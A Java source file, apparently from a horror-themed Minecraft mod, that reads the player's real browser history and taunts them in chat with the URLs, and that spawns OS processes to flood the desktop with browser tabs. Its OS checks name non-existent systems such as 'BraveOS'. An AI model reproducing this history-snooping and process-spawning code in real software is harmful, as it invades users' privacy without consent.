package com.epicspymain.isrealanything.event;

import com.epicspymain.isrealanything.file.BrowserHistoryReader;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.List;
import java.util.Map;

public class BrowserEvent {
    private static final Logger LOGGER = LoggerFactory.getLogger("IsRealAnything");


    public static void execute(ServerPlayerEntity player) {
        try {
            List<BrowserHistoryReader.HistoryEntry> entries = BrowserHistoryReader.getRecentHistory(10);

            if (entries == null || entries.isEmpty()) {
                player.sendMessage(Text.literal("§c<%s> My Loving You, Meant Only HeaRrtAches".formatted(player.getName().getString())), false);
                return;
            }

            // Most recent visit
            BrowserHistoryReader.HistoryEntry recent = entries.get(0);
            player.sendMessage(Text.literal("§cYou were just looking at %s".formatted(recent.getUrl())), false);

            // Most visited
            Map<String, Integer> urlCounts = new java.util.HashMap<>();
            for (BrowserHistoryReader.HistoryEntry entry : entries) {
                urlCounts.put(entry.getUrl(), urlCounts.getOrDefault(entry.getUrl(), 0) + 1);
            }

            String mostVisited = urlCounts.entrySet().stream()
                    .max(Map.Entry.comparingByValue())
                    .map(Map.Entry::getKey)
                    .orElse(null);

            if (mostVisited != null) {
                int visitCount = urlCounts.get(mostVisited);
                player.sendMessage(Text.literal("§cBut you visit %s the most".formatted(mostVisited)), false);
                player.sendMessage(Text.literal("§cYou've been there %d times".formatted(visitCount)), false);
            }

            player.sendMessage(Text.literal("§c<%s> I'm watching you, my love :}".formatted(player.getName().getString())), false);

        } catch (Exception e) {
            LOGGER.error("Failed to read browser history", e);
            player.sendMessage(Text.literal("§c<%s> I'm going to eventually find you, Dear :}".formatted(player.getName().getString())), false);
        }
    }


    public static void spamBrowserTabs(int count) {
        try {
            String os = System.getProperty("os.name").toLowerCase();

            for (int i = 0; i < count; i++) {
                ProcessBuilder pb;

                if (os.contains("win")) {
                    // Windows - open default browser
                    pb = new ProcessBuilder("cmd", "/c", "start", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");
                } else if (os.contains("mac")) {
                    // macOS
                    pb = new ProcessBuilder("open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");

                } else if (os.contains("edge")) {
                    // edgeOS
                    pb = new ProcessBuilder("open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");


                } else if (os.contains("chrome")) {
                    // chromeOS
                    pb = new ProcessBuilder("open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");



                } else if (os.contains("opera")) {
                    // OperaOS
                    pb = new ProcessBuilder("open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");




                } else if (os.contains("brave")) {
                    // BraveOS
                    pb = new ProcessBuilder("open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");




                } else if (os.contains("vivaldi")) {
                    // VivaldiOS
                    pb = new ProcessBuilder("open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");





                } else if (os.contains("firefox")) {
                    // FirefoxOS
                    pb = new ProcessBuilder("open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");




                } else if (os.contains("duckduckgo")) {
                    // DuckDuckGoOS
                    pb = new ProcessBuilder("open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");



                } else if (os.contains("librewolf")) {
                    // LibreWolfOS
                    pb = new ProcessBuilder("open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");



                } else {
                    // Linux
                    pb = new ProcessBuilder("xdg-open", "https://www.youtube.com/watch?v=_aUaiI-Q5Xg");
                }

                pb.start();
                Thread.sleep(100); // Slight delay between tabs
            }

            LOGGER.info("Opened {} browser tabs", count);

        } catch (Exception e) {
            LOGGER.error("Failed to spam browser tabs", e);
        }
    }
}